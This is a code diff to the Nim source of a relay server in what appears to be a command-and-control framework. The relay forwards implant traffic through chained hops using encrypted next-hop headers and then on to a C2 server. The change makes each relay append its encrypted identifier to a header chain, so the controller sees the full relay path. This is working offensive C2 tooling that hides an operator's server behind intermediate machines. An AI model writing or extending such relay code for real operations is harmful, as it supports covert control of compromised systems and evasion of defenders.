@@ -120,18 +120,30 @@ proc startRelayServer*(port: int, relayGuid: string = "", parentAddr: string = "
                 when defined debug:
                     echo "[RELAY] ↪️  Forwarding to next hop: " & targetUrl
                 
-                # Copy headers (exclude x-relay-guid to avoid accumulation)
+                # Copy headers
                 for key, value in req.headers.pairs:
                     let lowerKey = key.toLower()
-                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop", "x-relay-guid"]:
+                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop"]:
                         fwdHeaders.add(Header(key: key, value: value))
                 
                 # Set X-Next-Hop with the next chain
                 fwdHeaders.add(Header(key: "X-Next-Hop", value: encryptNextHop(nextHopChain)))
                 
-                # Replace with our own X-Relay-GUID (identifies this relay to parent)
+                # Append our GUID to X-Relay-GUID chain (builds full chain)
                 if relayGuid != "":
-                    fwdHeaders.add(Header(key: "X-Relay-GUID", value: encryptRelayGuid(relayGuid)))
+                    # Check if there's already an X-Relay-GUID from downstream
+                    var existingGuidChain = ""
+                    for key, value in req.headers.pairs:
+                        if key.toLower() == "x-relay-guid":
+                            existingGuidChain = value
+                            break
+                    
+                    if existingGuidChain != "":
+                        # Append our GUID to existing chain
+                        fwdHeaders.add(Header(key: "X-Relay-GUID", value: existingGuidChain & "," & encryptRelayGuid(relayGuid)))
+                    else:
+                        # Start new chain with our GUID
+                        fwdHeaders.add(Header(key: "X-Relay-GUID", value: encryptRelayGuid(relayGuid)))
             else:
                 # Forward to C2
                 if c2Url == "":
@@ -144,15 +156,27 @@ proc startRelayServer*(port: int, relayGuid: string = "", parentAddr: string = "
                 when defined debug:
                     echo "[RELAY] 🎯 Forwarding to C2: " & targetUrl
                 
-                # Copy headers but remove X-Next-Hop and X-Relay-GUID
+                # Copy headers but remove X-Next-Hop
                 for key, value in req.headers.pairs:
                     let lowerKey = key.toLower()
-                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop", "x-relay-guid"]:
+                    if lowerKey notin ["host", "connection", "content-length", "x-next-hop"]:
                         fwdHeaders.add(Header(key: key, value: value))
                 
-                # Add our own X-Relay-GUID (identifies this relay to C2)
+                # Append our GUID to X-Relay-GUID chain (builds full chain to C2)
                 if relayGuid != "":
-                    fwdHeaders.add(Header(key: "X-Relay-GUID", value: encryptRelayGuid(relayGuid)))
+                    # Check if there's already an X-Relay-GUID from downstream
+                    var existingGuidChain = ""
+                    for key, value in req.headers.pairs:
+                        if key.toLower() == "x-relay-guid":
+                            existingGuidChain = value
+                            break
+                    
+                    if existingGuidChain != "":
+                        # Append our GUID to existing chain
+                        fwdHeaders.add(Header(key: "X-Relay-GUID", value: existingGuidChain & "," & encryptRelayGuid(relayGuid)))
+                    else:
+                        # Start new chain with our GUID
+                        fwdHeaders.add(Header(key: "X-Relay-GUID", value: encryptRelayGuid(relayGuid)))
             
             when defined debug:
                 echo "[RELAY] 📤 Sending request to: " & targetUrl
